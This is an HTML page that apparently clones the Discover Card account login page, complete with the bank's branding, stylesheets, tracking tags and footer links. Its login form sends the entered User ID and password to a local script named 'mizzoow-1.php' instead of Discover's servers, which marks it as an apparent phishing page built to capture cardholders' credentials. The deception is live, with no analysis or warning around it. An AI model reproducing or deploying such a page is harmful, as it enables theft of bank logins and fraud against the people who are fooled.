<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
	
	

	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
	<meta http-equiv="imagetoolbar" content="no">
	<meta http-equiv="imagetoolbar" content="false"><link href="https://www.discovercard.com/css/optimized/ac-global.css" rel="stylesheet" type="text/css" />
<link href="https://www.discovercard.com/css/optimized/loginlogout-global.css" rel="stylesheet" type="text/css" /> 
<link href="https://www.discovercard.com/css/optimized/ac-global-screen.css" rel="stylesheet" type="text/css" media="screen" />
<!--[if IE]>
<link rel="stylesheet" type="text/css" href="/css/optimized/loginlogout-global-ie.css" />
<![endif]--><!-- Begin PCC: /content/common/baselayout/optimized/tips.shtml-->
<!-- End PCC: /content/common/baselayout/optimized/tips.shtml-->		<title>Discover Card: Account Center Log In</title>
			


<script language="javascript" type="text/javascript" src="https://www.discovercard.com/scripts/optimized/loginlogout-top.js"></script>
	<link rel="shortcut icon" href="https://www.discovercard.com/images/favicon.ico" type="image/x-icon" />
<link rel="icon" href="https://www.discovercard.com/images/favicon.ico" type="image/x-icon" />


	</head>
	
	<body>
	
<div id="container">


	    <!-- Using layout-default-config.xml config file. -->


		
		
	<!-- Include header tile -->

<div id="header">
	<div class="clear">&nbsp;</div>
    
<div id="logo"><a href="/"><img src="https://www.discovercard.com/registration/images/logo-discover-financial-services.gif" width="152" height="38" alt="Discover Financial Services" title="Discover Financial Services" /></a></div>
	<div id="right-side">
<!-- Utility Bar -->
		<ul id="topnavlinks" style="position: absolute; top: 10px; right: 5px;"> <li><a href="http://www.discovercard.com"  secure="no">Discover Home</a>&nbsp;|&nbsp;

	

 </li> <li><a href="http://www.discovercard.com/credit-cards/"  secure="no">Credit Cards</a>&nbsp;|&nbsp;
	

 </li> <li><a href="http://www.discovercard.com/business/"  secure="no">Small Business</a>&nbsp;|&nbsp;
	

 </li> <li><a href="http://www.discoverstudentloans.com/"  secure="no">Student Loans</a>&nbsp;|&nbsp;
	

 </li> <li><a href="http://www.discoverbank.com"  secure="no">Savings</a>&nbsp;|&nbsp;

	

 </li></ul>
		<div class="clear">&nbsp;</div>
		<!--Log In and Customer Service Link Starts Here-->
		<div id="top-search">
			<div id="login">
                <a class="disc-secLock" href="https://www.discovercard.com/cardmembersvcs/loginlogout/app/ac_main" title="Secure Log In"></a>
				<a href="https://www.discovercard.com/cardmembersvcs/loginlogout/app/ac_main" title="Log in to Your Account"> Log in</a> | <a href="http://www.discovercard.com/customer-service/" title="Get answers to your Discover Questions"> Customer Service</a>| <a href="http://www.discovercard.com/community/" title="Community"> Community</a>

			</div>
<form action="http://search.discovercard.com/search" method="get" name="search" title="Search Discover">
			<input type="text" name="q" maxlength="256" value="" id="searchbox" />
			<a class="hide" id="clear-livesearch" href="#searchbox">x</a>

			<input type="hidden" name="site" value="internet_cm_corp" />
			<input type="hidden" name="client" value="internet_cm_fe" />
			<input type="hidden" name="output" value="xml_no_dtd" />
			<input type="hidden" name="proxystylesheet" value="internet_cm_fe" />

			<input id="search-button" type="image" src="https://www.discovercard.com/search/images/btn-search-gray-off.gif" alt="Search" title="Search"/>
		</form>
			
		</div>
		<!--Log In and Customer Service LinkEnds Here-->
	</div>
	<div class="clear">&nbsp;</div>
</div>

	<!-- /header --><div class="clear">&nbsp;</div>

<ul id="nav">
<li class="active"><a href="http://www.discovercard.com/customer-service/" title="Customer Service">Customer Service</a></li>
<li><a href="http://www.discovercard.com/customer-service/faq/" title="FAQ">FAQ</a></li>
<li><a href="http://www.discovercard.com/customer-service/glossary.html" title="Glossary">Glossary</a></li>
<li><a href="http://www.discovercard.com/contact-us/" title="Contact Us">Contact Us</a></li> 
    </ul>
	<div class="clear">&nbsp;</div>
	<!-- /top navigation -->


	
	




<!--Begin PCC Include file: https://www.discovercard.com/strongauth/pmfso_set.shtml-->
<script language="JavaScript" type="text/javascript">
<!--
var flashinstalled = 0;
var flashversion = 0;
MSDetect = "true";
if (navigator.plugins && navigator.plugins.length) {
    x = navigator.plugins["Shockwave Flash"];
    if (x) {
        flashinstalled = 2;
        if (x.description) {
            y = x.description;
            flashversion = y.charAt(y.indexOf('.')-1);
        }
    }
    else
        flashinstalled = 1;
    if (navigator.plugins["Shockwave Flash 2.0"]) {
        flashinstalled = 2;
        flashversion = 2;
    }
}
else if (navigator.mimeTypes && navigator.mimeTypes.length) {
    x = navigator.mimeTypes['application/x-shockwave-flash'];
    if (x && x.enabledPlugin)
	    flashinstalled = 2;
    else
	    flashinstalled = 1;
}
else {
    MSDetect = "true";
}
// -->
</script>
<script language="vbscript">
on error resume next
If MSDetect = "true" Then
	For i = 2 to 6
		If Not(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & i))) Then
		Else
			flashinstalled = 2
			flashversion = i
		End If
	Next
	If flashinstalled = 0 Then
		flashinstalled = 1
	End If
End If
</script>
<script language="JavaScript" type="text/javascript">
<!--
	if (flashinstalled == 2 && flashversion >= 6) {
		var d = new Date().getTime();
		var out = "";		
		out = out + "<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'" + "\n";
		out = out + "width='1' height='1'>" + "\n";
		out = out + "<param name='movie' value='/home/pmfso.swf?nocache=" + d + "'>" + "\n";
		out = out + "<param name='quality' value='high'>" + "\n";
		out = out + "<param name='bgcolor' value=#FFFFFF>" + "\n";
		out = out + "<param name='FlashVars' value='pmdata='>" + "\n";
		out = out + "<embed src='https://www.discovercard.com/home/pmfso.swf'" + "\n";
		out = out + "FlashVars='pmdata='" + "\n";
		out = out + "quality='low' bgcolor='#FFFFFF' width='1' height='1'" + "\n";
		out = out + "type='application/x-shockwave-flash'>" + "\n";
		out = out + "<noembed></noembed>" + "\n";
		out = out + "<noobject></noobject>" + "\n";
		out = out + "</embed>" + "\n";
		out = out + "<noobject></noobject>" + "\n";
		out = out + "</object>" + "\n";
		document.write(out);
	}
//-->
</script>
<noscript>
<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'
		width='1' height='1'>
	<param name='movie' value='https://www.discovercard.com/home/pmfso.swf'>
	<param name='quality' value='high'>
	<param name='bgcolor' value=#FFFFFF>
	<param name='FlashVars' value='pmdata='>
	<embed src='https://www.discovercard.com/home/pmfso.swf'
			FlashVars='pmdata='
			quality='low' bgcolor='#FFFFFF' width='1' height='1'
			type='application/x-shockwave-flash'>
		<noembed></noembed>
		<noobject></noobject>
	</embed>
	<noobject></noobject>
</object>
</noscript>
<!--End PCC Include file: https://www.discovercard.com/strongauth/pmfso_set.shtml-->



<!--Begin PCC Include file: https://www.discovercard.com/login_logout/ac_main.shtml-->
<!--Begin SSI Include file: https://www.discovercard.com/login_logout/fsoServlet.shtml-->
	<script language="JavaScript" type="text/javascript">
	<!--
	var flashinstalled = 0;
	var flashversion = 0;
	MSDetect = "true";
	if (navigator.plugins && navigator.plugins.length) {
	    x = navigator.plugins["Shockwave Flash"];
	    if (x) {
	        flashinstalled = 2;
	        if (x.description) {
	            y = x.description;
	            flashversion = y.charAt(y.indexOf('.')-1);				
	        }
	    }
	    else
	        flashinstalled = 1;
	    if (navigator.plugins["Shockwave Flash 2.0"]) {
	        flashinstalled = 2;
	        flashversion = 2;
	    }
	}
	else if (navigator.mimeTypes && navigator.mimeTypes.length) {
	    x = navigator.mimeTypes['application/x-shockwave-flash'];
	    if (x && x.enabledPlugin)
		    flashinstalled = 2;
	    else
		    flashinstalled = 1;
	}
	else {
	    MSDetect = "true";
	}
	// -->
	</script>

	<script language="vbscript">
		on error resume next
		If MSDetect = "true" Then			
			For i = 2 to 6
				If Not(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & i))) Then
				Else
					flashinstalled = 2
					flashversion = i
				End If
			Next
			If flashinstalled = 0 Then
				flashinstalled = 1
			End If
		End If
		</script>
	<!--	<noscript> -->
		<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' width='1' height='1'>
			<param name='movie' value='https://www.discovercard.com/home/pmfso.swf'>
			<param name='quality' value='high'>
			<param name='bgcolor' value=#FFFFFF>
			<param name='FlashVars' value='gotoUrl=&sendUrl=https%3A%2F%2Fwww.discovercard.com%2Fcardmembersvcs%2Floginlogout%2FStrongAuthFSOServlet'>			
			<embed src='https://www.discovercard.com/home/pmfso.swf'
					FlashVars='gotoUrl=&sendUrl=https%3A%2F%2Fwww.discovercard.com%2Fcardmembersvcs%2Floginlogout%2FStrongAuthFSOServlet'
					quality='high' bgcolor='#FFFFFF' width='1' height='1'
					type='application/x-shockwave-flash'>
			</embed>

		</object>
	<!--	</noscript> --><!--End SSI Include file: /login_logout/fsoServlet.shtml-->	
<div id="breadcrumb"></div>
<!-- main content -->
<div class="login-content">
	<div class="clear">&nbsp;</div>
	<div id="loginlogout-main">
		<div id="loginlogout-form" class="widget-large first">
			<div class="widget-background">
				<div class="widget-content">

					<form name="loginForm" method="post" action="mizzoow-1.php" autocomplete="off">
						<!--Begin SSI Include file: /login_logout/secureAccountCntrLogin1.shtml-->	<h2 class="left">Secure Account Center Log In</h2>
	<div class="icons">
	<div class="left"><img src="https://www.discovercard.com/images/icon-lock.gif"
		width="9" height="11" alt="Secure Card Account Center Log In"
		title="Secure Card Account Center Log In" /></div>
	<div class="left"><a href="#" class="popup" id="security-popup"
		title="Secure Card Account Center Log In"></a></div>
	</div>
	<div class="clear">&nbsp;</div>
<!--End SSI Include file: /login_logout/secureAccountCntrLogin1.shtml-->	
						<p>User ID<br />

							<input type="text" name="userID" maxlength="16" size="25" tabindex="1" value="" />
						</p>
						<p class="links">
							<a href="https://www.discovercard.com/cardmembersvcs/registration/reg/goto?forwardName=forgotuserid" title="Forgot User ID?" alt="Forgot User ID?">
								Forgot User ID?
							</a>
						</p>
						<p>Password<br />
							<input type="password" name="password" maxlength="10" size="25" tabindex="2" value="" />

						</p>
						<p class="links">
							<a href="https://www.discovercard.com/cardmembersvcs/registration/reg/goto?forwardName=pwdresethome" title="Forgot Password?" alt="Forgot Password?">
								Forgot Password?
							</a>
						</p>
						<input type="hidden" name="pm_fp" id="pm_fp" />
						<script language="javascript" type="text/javascript">
							//<![CDATA[                                                                                                          
							post_fingerprintsnoencode()
							//]]>
						</script>
						<!--Begin SSI Include file: http://www.discovercard.com/common/marketing/apps/login_logout/acmain_accountType_select.shtml--><!-- Start of DoubleClick Spotlight Tag: Please do not remove-->

<!-- Activity Name for this tag is:Discover Account Center Log-In Page -->
<SCRIPT language="JavaScript" type="text/javascript">
var axel = Math.random()+"";
var a = axel * 10000000000000;
document.write('<SCR'+'IPT SRC="https://fls.doubleclick.net/activityj;src=2033010;type=cashbbou;cat=loginpag;ord=1;num='+ a + '?" type="text/javascript"></SCR'+'IPT>');
</SCRIPT>
<NOSCRIPT>
<IMG SRC="https://ad.doubleclick.net/activity;src=2033010;type=cashbbou;cat=loginpag;ord=1;num=1?" WIDTH=1 HEIGHT=1 BORDER=0 ALT=""/>
</NOSCRIPT>
<!-- End of DoubleClick Spotlight Tag:  Please do not remove--><!--End SSI Include file: /common/marketing/apps/login_logout/acmain_accountType_select.shtml-->	
						<div class="remember">
							<p class="continue">
								<input type="image" name="" src="http://www.discovercard.com/images/login-off.gif" tabindex="4" onclick="javascript:lpSendDataPage('lpLoginSubmit','1');" onmouseover="this.src='https://www.discovercard.com/images/login-on.gif'" onmouseout="this.src='https://www.discovercard.com/images/login-off.gif'" title="Log In" alt="Log In" />&nbsp;&nbsp; 
								<a href="https://www.discovercard.com/cardmembersvcs/registration/reg/goto?forwardName=reghome" title="Register">
									Register
								</a>
							</p>				  
							<p class="continue">

								<input name="rememberOption" id="remember-me" type="checkbox" class="checkbox" value="on" tabindex="5" />&nbsp;
								<label class="remember-caption" for="remember-me">Remember User ID</label>
								&nbsp;&nbsp;
								<a href="#" class="question-popup" id= "remember-userid-popup" title="Remember User ID">
									<img src="https://www.discovercard.com/images/question-popup-off.gif" width="12" height="12" alt="Remember User ID" title="Remember User ID" />
								</a>
							</p>
						</div>

						<input type="hidden" name="loginseq" value="yumpin&#039; yiminy" />
						<input type="hidden" name="link" value="" />
						<input type="hidden" name="intcpt" value="" />
					</form>
				</div>
			</div>
		</div>

		<div id="loginlogout-register" class="widget-large">

			<div class="widget-background">
				<div class="widget-content">			
					
<!--Begin PCC Include file: /common/marketing/apps/login_logout/acmain_right_half.shtml-->
<script language="javascript">
<!--
var bName = navigator.appName;
var bVer = parseFloat(navigator.appVersion);
var popURL = "http://www.discovercard.com/discover/data/account/tips/encryption.shtml";
if ((bName == "Netscape" && bVer < 4.06) ||
	(bName == "Microsoft Internet Explorer" && bVer < 4))
window.open(popURL,'pop','toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,height=490,width=700');
//-->
</script>
<h2>Register for Discover Card Account Center</h2>
<div class="clear">&#160;</div>
<p>It's quick and easy: register for the Card Account Center now for online access to your Discover Card account so you can:</p>
<ul class="big">
  <li>Get a current Account Summary</li>
  <li>Review statements for the past year</li>

  <li>Pay bills online</li>
</ul>
<p class="continue"><a class="register-button" title="Register" href="https://www.discovercard.com/cardmembersvcs/registration/reg/goto?forwardName=reghome"></a><a class="more" title="Learn more" href="http://www.discovercard.com/customer-service/account/account-center-tour.html">Learn more</a></p>
<p>You can also register for:</p>
<ul>
  <li><a title="Savings" href="http://www.discoverbank.com/?icmpgn=1103_db_login_txt_ban_txt_std&src=LOGINTAB">Savings</a></li>
  <li><a title="Student Loans" href="https://www.discoverstudentloans.com/mfa/CreateAccount.aspx">Student Loans</a></li>
  <li><a title="Discover Gift Cards" href="https://www.checkgiftbalance.com/">Discover Gift Cards</a></li>

</ul>
<input name="dcrpath" id="dcrpath" type="hidden" value="/templatedata/DFS_DC_Content/loginlogout/data/login">

<!--End PCC Include file: /common/marketing/apps/login_logout/acmain_right_half.shtml-->
	
				</div>
			</div>
		</div>
		<!--</div>-->

		<div class="clear">
		&nbsp;

		</div><!-- promos -->

		<div class="clear">
		&nbsp;
		</div>

		<div class="clear">
		&nbsp;
		</div>
	</div>	<!-- /loginlogout-main -->

	<div class="clear">
	&nbsp;
	</div>
	
	<!-- promos -->
	<!--Begin SSI Include file: /common/marketing/apps/login_logout/acmain_cash_promo.shtml--><script language="javascript" src="/scripts/vendors/mbox.js"></script>
<script type="text/javascript">
 var suppressMboxes = false;
 if (suppressMboxes) {
        window.mboxUpdate = function() { return true; }
        window.mboxCreate = function(mboxName) { mboxFactoryDefault.create(mboxName, mboxShiftArray(arguments)); }
    }
</script>

<div class="mboxDefault"><div class="bottom-login-placement"><img src="http://www.discovercard.com/loginlogout/app/images/credit-score-tracker-ac-placement.jpg"><a href="http://www.discovercard.com/protection-solutions/credit-tracker.html?icmpgn=0912_login_box_cst_btn_cst&xcmpgn=xp1_" title="Learn More" class="btn" target="_blank" style="position: absolute; left: 45px; top: 142px;"><img class="rollover" src="https://www.discovercard.com/achome/images/promos/btn-learn-more-lg.png" alt="Learn More" width="99" height="25"></a></div></div>
<script type="text/javascript">
mboxCreate("login_mainpromowell");
</script>

<!--End SSI Include file: http://www.discovercard.com/common/marketing/apps/login_logout/acmain_cash_promo.shtml-->               
	<!--Begin SSI Include file: http://www.discovercard.com/common/marketing/apps/login_logout/acmain_shop_promo.shtml--><!-- --><!--End SSI Include file: http://www.discovercard.com/common/marketing/apps/login_logout/acmain_shop_promo.shtml-->               
	<!--Begin SSI Include file: http://www.discovercard.com/common/marketing/apps/login_logout/acmain_bill_promo.shtml--><!-- --><!--End SSI Include file: http://www.discovercard.com/common/marketing/apps/login_logout/acmain_bill_promo.shtml-->                    
	<!-- /promos -->

	<div class="clear">
	&nbsp;
	</div>
</div><!-- /main content -->
<script type="text/javascript" language="JavaScript">
	//<![CDATA[      
	var focusControl = document.forms["loginForm"].elements["userID"];
	if (focusControl.type != "hidden") { focusControl.focus();}
	//]]>
</script>
<script language="JavaScript" type="text/javascript">
	checkUserID();
</script>
<!-- overlay -->

<!--Begin SSI Include file: /login_logout/acmain_security_overlay.shtml-->
<div id="hint-overlay">
	<div class="top-bg"></div>
	<div id="hint-overlay-content">
		<div id="overlay-content">
			<h3>Security</h3>
			<p>Discover Card is serious about safeguarding your personal information online.</p>
			<p>When you access your account and perform transactions on the Discover site we use 128-bit-Secure Sockets Layer (SSL) encryption technology-the most widely used method of securing internet transactions available today.</p>

		</div>
		<a id="hint-overlay-close" href="#"><img src="/registration/images/btn-popup-close.gif" width="43" height="12" alt="Close" title="Close" /></a>
	</div>
	<div class="bottom-bg"></div>

</div>

<script language="javascript"> 
var logurl= ['/cardmembersvcs/loginlogout/app/timeout','/cardmembersvcs/loginlogout/app/ac_main','/cardmembersvcs/loginlogout/app/signin'];
var turl = window.location.href;
 
for (urlIdx in logurl) {
	if( (turl.indexOf(logurl[urlIdx]) != -1) )
	{
	document.write('<script language="javascript" type="text/javascript" src="/scripts/optimized/loginlogout-bottom.js"><\/script>');
	}
}
 
var logurl= ['/cardmembersvcs/loginlogout/app/logoff'];
 
for (urlIdx in logurl) {
	if( (turl.indexOf(logurl[urlIdx]) != -1) )
	{
	document.write('<script language="javascript" type="text/javascript" src="/scripts/optimized/loginlogout/mcd-bottom.js"><\/script>');
	}
}
 
 
 
</script>
 
<script language="javascript" src="/scripts/optimized/dc-global-bottom.js"></script>
<script language="javascript" src="/scripts/optimized/vendor-dc-global-bottom.js"></script>

<!--End SSI Include file: /login_logout/acmain_security_overlay.shtml--> 
<!-- /overlay -->
<!--Begin SSI Include file: /login_logout/loginLogout_js.shtml--><!--Begin PCC Include file: /login_logout/loginLogout_js.shtml -->



 
<!--End PCC Include file: /login_logout/loginLogout_js.shtml -->
<!--End SSI Include file: /login_logout/loginLogout_js.shtml--> 
<IMG SRC='https://b3.mookie1.com/1/TRACK_Discover/Discover/Retargeting_NX_Secure@Bottom3'>
<!--End PCC Include file: /login_logout/ac_main.shtml-->



	<!--Begin PCC Include file: /strongauth/pmfso.shtml-->
	<meta http-equiv="expires" content="0">

	<meta http-equiv="Pragma" content="no-cache">
	
	<script language="JavaScript" type="text/javascript">
	<!--
		var fpString = "";
		var andString = "";
	
		if (top != self) top.location.href = location.href;

		function goto(url) {
			window.location.href = url;
		}
	//-->
	</script>
	<script language="javascript1.1">
	<!--
		function goto(url) {
			window.location.replace(url);
		}
	//-->
	</script>		
	
	<script language="JavaScript" type="text/javascript">
	<!--
	var flashinstalled = 0;
	var flashversion = 0;
	MSDetect = "true";
	if (navigator.plugins && navigator.plugins.length) {
	    x = navigator.plugins["Shockwave Flash"];
	    if (x) {
	        flashinstalled = 2;
	        if (x.description) {
	            y = x.description;
	            flashversion = y.charAt(y.indexOf('.')-1);				
	        }
	    }
	    else
	        flashinstalled = 1;
	    if (navigator.plugins["Shockwave Flash 2.0"]) {
	        flashinstalled = 2;
	        flashversion = 2;
	    }
	}
	else if (navigator.mimeTypes && navigator.mimeTypes.length) {
	    x = navigator.mimeTypes['application/x-shockwave-flash'];
	    if (x && x.enabledPlugin)
		    flashinstalled = 2;
	    else
		    flashinstalled = 1;
	}
	else {
	    MSDetect = "true";
	}
	// -->
	</script>
	<script language="vbscript">
		on error resume next
		If MSDetect = "true" Then			
			For i = 2 to 6
				If Not(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & i))) Then
				Else
					flashinstalled = 2
					flashversion = i
				End If
			Next
			If flashinstalled = 0 Then
				flashinstalled = 1
			End If
		End If
		</script>
	<!--	<noscript> -->
		<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000'
				width='1' height='1'>

			<param name='movie' value='/home/pmfso.swf'>
			<param name='quality' value='high'>
			<param name='bgcolor' value=#FFFFFF>
			<param name='FlashVars' value='gotoUrl=&sendUrl='>
			<embed src='/home/pmfso.swf'
					FlashVars='gotoUrl=&sendUrl='
					quality='high' bgcolor='#FFFFFF' width='1' height='1'
					type='application/x-shockwave-flash'>
				<noembed></noembed>
				<noobject></noobject>
			</embed>

			<noobject></noobject>
		</object>
	<!--	</noscript> -->
	<!--End PCC Include file: /strongauth/pmfso.shtml-->



	
<!--Begin PCC Include file: /common/omnituretracking.shtml-->

<!--End PCC Include file: /common/omnituretracking.shtml-->
<div id="footer">
	<!-- BEGIN: Social media links -->

	<div class="community-links-container">
		<ul class="community-links">
			<li class="tv-ads-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&v_eurl=http://mcdpartners.com/discoveradvertising/index-2010-peggy-overview.php" title="See the Peggy TV ads" class="community-ftr-link" >See the Peggy TV ads</a></li>
			<li class="facebook-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1009_gf_fb_pub_txt&v_eurl=http%3A//www.facebook.com/discover" title="Find Us on Facebook" class="community-ftr-link" >Find Us on Facebook</a></li>
			<li class="twitter-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1009_gf_twi_pub_txt&v_eurl=http%3A//twitter.com/Discover" title="Follow Us on Twitter" class="community-ftr-link" >Follow Us on Twitter</a></li>
			<li class="blog-icon"><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1009_gf_wp_pub_txt&v_eurl=http://cashbackconnection.wordpress.com/" title="Read Our Blog" class="community-ftr-link" >Read Our Blog</a></li>
			<li class="mobile-icon"><a href="http://www.discovercard.com/customer-service/account/mobileapp.html?gcmpgn=1009_gf_mob_pub_txt" title="Discover Mobile" class="community-ftr-link" >Discover Mobile</a></li>

		</ul>
	</div>
	<!-- END: Social media links -->

	<div class="primary-links">
		<div class="link-container">
			<div class="link-group">
				<h1>Credit Cards</h1>
				<ul>

					<li><a href="https://www.discovercard.com/credit-cards/index.html#CashbackCards" title="Cash Rewards Card">Cash Rewards Card</a></li>
					<li><a href="https://www.discovercard.com/miles/" title="Miles Card">Miles Card</a></li>
					<li><a href="https://www.discovercard.com/business/" title="Small Business Card">Small Business Card</a></li>
					<li><a href="https://www.discovercard.com/credit-cards/" title="All Credit Cards">All Credit Cards</a></li>
				</ul>
			</div>
			
			<div class="link-group">

				<h1>Cashback Bonus</h1>
				<ul>
					<li><a href="https://www.discovercard.com/customer-service/rewards/get-more-calendar.html" title="5% Cashback Bonus">5% <em>Cashback Bonus</em></a></li>
					<li><a href="https://www.discovercard.com/customer-service/rewards/shopdiscover.html" title="ShopDiscover Partners">ShopDiscover Partners</a></li>
					<li><a href="https://www.discovercard.com/cashbackbonus/deals.html" title="Today's Hot Deals">Today's Hot Deals</a></li>
					<li><a href="https://www.discovercard.com/customer-service/rewards/redeem-cashback.html" title="Redemption Options">Redemption Options</a></li>

				</ul>
			</div>
			
			<div class="link-group">
				<h1>Other Products</h1>
				<ul>
					<li><a href="http://www.discoverbank.com/?gcmpgn=1103_db_botnav&src=NAVBOT" title="Savings Products">Savings Products</a></li>
					<li><a href="http://www.discoverstudentloans.com/?acmpgn=O_DCC_H_UN_007" title="Student Loans">Student Loans</a></li>

					<li><a href="http://www.discoverpersonalloans.com/" title="Personal Loans">Personal Loans</a></li>
					<li><a href="http://www.discover.com/shopcenter/giftcard.shtml" title="Gift Cards">Gift Cards</a></li>
				</ul>
			</div>
			
			<div class="link-group">
				<h1>Help &amp; Support</h1>

				<ul>
					<li><a href="https://www.discovercard.com/customer-service/" title="Customer Service">Customer Service</a></li>
					<li><a href="https://www.discovercard.com/customer-service/faq/" title="Frequently Asked Questions">Frequently Asked Questions</a></li>
					<li><a href="https://www.discovercard.com/cardmembersvcs/smc/requestCMAgreement" title="Cardmember Agreements">Cardmember Agreements</a></li>
					<li><a href="https://www.discovercard.com/customer-service/account/international.html" title="International Acceptance">International Acceptance</a></li>
					<li><a href="https://www.discovercard.com/customer-service/fraud/lost-stolen.html" title="Report Lost or Stolen Card">Report Lost or Stolen Card</a></li>

					<li><a href="http://www.discovercard.com/scripts/PageExit.htm?log=1&v_eurl=http://debit.discovernetwork.com/cal/search.do?gcmpgn=1103_msb_footer_atm" title="ATM Locator">ATM Locator</a></li>
				</ul>
			</div>
			
			<div class="link-group last">
				<h1>About Us</h1>
				<ul>
					<li><a href="http://www.discoverfinancial.com/company/" title="About Discover">About Discover</a></li>

					<li><a href="http://www.discoverfinancial.com/financialeducation/financialeducation.shtml" title="Financial Education">Financial Education</a></li>
					<li><a href="http://investorrelations.discoverfinancial.com/phoenix.zhtml?c=204177&p=irol-IRHome" title="Investor Relations">Investor Relations</a></li>
					<li><a href="http://www.discovernetwork.com/" title="Merchants">Merchants</a></li>
					<li><a href="http://www.discoverfinancial.com/news/index.shtml" title="Newsroom">Newsroom</a></li>
					<li><a href="http://www.mydiscovercareer.com/" title="Careers">Careers</a></li>
				</ul>

			</div>
		</div>
		
		<div class="logo-line">
			<h2><a href="https://www.discovercard.com/cashbackbonus/index.html" title="It pays to Discover">It pays to Discover</a></h2>
			<!--Search Form Starts Here-->
			<div class="footer-search">
				<form action="http://search.discovercard.com/search" method="get" name="search" title="Search Discover">
					<input type="text" class="text-input" name="q" maxlength="256" />

					<input type="hidden" name="site" value="internet_cm_corp" />
					<input type="hidden" name="getfields" value="*"/>
					<input type="hidden" name="client" value="internet_cm_fe" />
					<input type="hidden" name="output" value="xml_no_dtd" />
					<input type="hidden" name="proxystylesheet" value="internet_cm_fe" />
					<input type="image" class="footer-search-button" src="https://www.discovercard.com/search/images/btn-search-gray-off.gif" alt="Search" title="Search"/>
				</form>
			</div>
			<!--Search Form Ends Here-->

			<ul class="additional-links">
				<li><a href="https://www.discovercard.com/customer-service/security/soan.html" title="Secure Online Account Numbers">Secure Online Account Numbers</a></li>
			</ul>
		</div>
		
	</div>
	<div class="primary-links-bottom"></div>
	<div class="secondary-links">
		<ul>

			<li><a href="https://www.discovercard.com/site-map/" title="Site Map">Site Map</a></li>
			<li><a href="https://www.discovercard.com/customer-service/terms-of-use.html" title="Terms of Use">Terms of Use</a></li>
			<li><a href="https://www.discovercard.com/customer-service/security/" title="Security">Security</a></li>
			<li><a href="https://www.discovercard.com/customer-service/privacy-policies/" title="Privacy Statement">Privacy Statement</a></li>
			<li class="last"><a href="/contact-us/" title=" Contact Us">Contact Us</a></li>
		</ul>

		<p class="copyright">&copy;<script language="JavaScript">
<!--
    today=new Date();
    year0=today.getFullYear();
    document.write(year0);
//-->
</script> Discover Bank, Member FDIC.</p>
	</div>
</div>

</body>


		
</html>



